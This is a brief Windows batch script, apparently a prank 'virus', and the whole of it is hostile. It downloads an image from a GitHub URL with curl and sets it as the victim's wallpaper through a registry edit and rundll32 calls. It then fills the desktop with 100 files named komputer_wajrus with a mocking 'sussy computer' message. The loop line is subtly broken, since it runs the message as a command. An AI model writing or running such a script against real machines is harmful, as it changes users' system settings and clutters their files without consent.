@echo off
cd %userprofile%

curl https://raw.githubusercontent.com/kamilix2003/pejAD/master/reklama.jpg -o reklama.bmp

reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d %userprofile%\reklama.bmp /f

RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters
RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters

cd %userprofile%\desktop

for /l %%G in (1,1,100) do TH1S 1S $U$$Y K0MPUTER WAJRU$!!! >>komputer_wajrus%%G.txt

exit
